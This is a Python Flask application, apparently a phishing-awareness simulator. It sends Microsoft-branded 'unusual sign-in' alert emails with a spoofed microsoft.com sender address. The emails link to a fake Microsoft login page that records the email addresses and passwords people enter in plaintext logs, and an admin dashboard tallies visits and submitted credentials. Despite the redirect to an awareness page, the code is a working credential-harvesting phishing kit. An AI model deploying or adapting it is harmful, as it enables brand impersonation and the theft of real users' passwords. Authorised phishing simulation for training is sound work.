import os
from functools import wraps
from flask import Flask, render_template, request, redirect, url_for, flash, session
import smtplib
from email.mime.multipart import MIMEMultipart   # NEW
from email.mime.text import MIMEText             # ← keep / reuse
from collections import Counter
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'your_secret_key'

# ------------ configuration ------------
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)
ADMIN_PASSWORD = os.getenv('ADMIN_PASSWORD')

# ------------ auth decorator ------------
def login_required(view_func):
    @wraps(view_func)
    def wrapped(*args, **kwargs):
        if not session.get('logged_in'):
            flash('Please log in to access the dashboard.')
            return redirect(url_for('admin_login'))
        return view_func(*args, **kwargs)
    return wrapped

# ------------ basic routes ------------
@app.route('/')
def home():
    return render_template("index.html")

@app.route('/send-email', methods=['POST'])
def send_email():
    """
    Send a Microsoft‑branded “unusual sign‑in activity” alert that
    includes an **HTML button** which links to our fake login page.
    """
    recipient = request.form['email'].strip()

    # Build a tracking URL that pre‑fills the victim’s address and tags the campaign
    tracking_url = url_for(
        'fake_login',
        _external=True,
        track="microsoft2025",
        email=recipient
    )

    # ---------- e‑mail content ----------
    plain_text = f"""\
We detected something unusual about a recent sign‑in to your Microsoft account.

Sign‑in details
───────────────
Country/region : Unknown
IP address     : {request.remote_addr or '***.***.***.***'}
Date           : {datetime.utcnow().strftime('%d %B %Y, %H:%M UTC')}
───────────────

If this was you, you can safely ignore this e‑mail. If not, please review your
account activity and secure your account immediately:

{tracking_url}

Thanks,
The Microsoft account team
"""  
    html_text = f"""\
<!DOCTYPE html>
<html>
  <body style="font-family: Arial, sans-serif; color: black;">
    <p>We detected something unusual about a recent sign‑in to your Microsoft account.</p>

    <p>Sign‑in details<br>
    Country/region : Unknown<br>
    IP address     : {request.remote_addr or '***.***.***.***'}<br>
    Date           : {datetime.utcnow().strftime('%d %B %Y, %H:%M UTC')}<br>
    </p>

    <p>If this was you, you can safely ignore this e‑mail. If not, please review your
    account activity and secure your account immediately:</p>

    <p style="text-align:center; margin:24px 0;">
      <a href="{tracking_url}"
         style="background:#0067b8; color:#ffffff; padding:12px 28px;
                text-decoration:none; font-weight:600; border-radius:4px;
                display:inline-block;">
        Sign in
      </a>
    </p>

    <p>Thanks,<br>The Microsoft account team</p>
  </body>
</html>
"""

    # ---------- build a multipart/alternative message ----------
    msg = MIMEMultipart("alternative")
    msg['Subject'] = 'Security alert for your Microsoft account'
    msg['From']    = 'Microsoft Account Team <no-reply@microsoft.com>'
    msg['To']      = recipient

    # Attach plain‑text first, then HTML
    msg.attach(MIMEText(plain_text, "plain"))
    msg.attach(MIMEText(html_text,  "html"))

    # ---------- send ----------
    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(os.getenv('SMTP_USER'), os.getenv('SMTP_PASS'))
            server.send_message(msg)
        flash(f"✅ Security alert sent to {recipient}")
    except Exception as e:
        return f"Failed to send e‑mail: {str(e)}"

    return redirect(url_for('home'))

@app.route('/login', methods=['GET', 'POST'])
def fake_login():
    """
    Microsoft‑looking sign‑in form that harvests credentials.
    """
    campaign = request.args.get('track', 'unknown')
    log_event(f"VISIT: Campaign={campaign}, IP={request.remote_addr}, UA={request.headers.get('User-Agent')}")

    if request.method == 'POST':
        email    = request.form['email']
        password = request.form['password']
        log_event(f"SUBMIT: Email={email}, Password={password}, Campaign={campaign}")
        return redirect('/awareness')

    # Pre‑fill e‑mail field if we know the address from the query string
    prefill_email = request.args.get('email', '')
    return render_template("fake_login.html", prefill_email=prefill_email)

@app.route('/awareness')
def awareness():
    return render_template("awareness.html")

# ------------ auth routes ------------
@app.route('/admin-login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        if request.form.get('password') == ADMIN_PASSWORD:
            session['logged_in'] = True
            flash('Logged in successfully!')
            return redirect(url_for('dashboard'))
        flash('Incorrect password.')
    return render_template('admin_login.html')

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    flash('Logged out.')
    return redirect(url_for('admin_login'))

# ------------ protected routes ------------
@app.route('/dashboard')
@login_required
def dashboard():
    log_file = os.path.join(LOG_DIR, "events.log")
    events, visits_counter, submits_counter = [], Counter(), Counter()

    if os.path.exists(log_file):
        with open(log_file, "r") as f:
            for line in f:
                events.append(line.strip())
                date_key = line.split(' ')[0]
                (submits_counter if 'SUBMIT' in line else visits_counter)[date_key] += 1

    all_dates      = sorted(set(visits_counter) | set(submits_counter))
    daily_visits   = [visits_counter.get(d, 0)  for d in all_dates]
    daily_submits  = [submits_counter.get(d, 0) for d in all_dates]

    return render_template(
        "dashboard.html",
        events         = events,
        chart_labels   = all_dates,
        chart_visits   = daily_visits,
        chart_submits  = daily_submits,
        total_visits   = sum(daily_visits),
        total_submits  = sum(daily_submits)
    )

@app.route('/delete-logs', methods=['POST'])
@login_required
def delete_logs():
    open(os.path.join(LOG_DIR, "events.log"), 'w').close()
    flash('All logs deleted successfully.')
    return redirect(url_for('dashboard'))

# ------------ helper ------------
def log_event(data):
    with open(os.path.join(LOG_DIR, "events.log"), "a") as f:
        f.write(f"{datetime.now()} - {data}\n")

# ------------ run ------------
if __name__ == '__main__':
    app.run(debug=True)
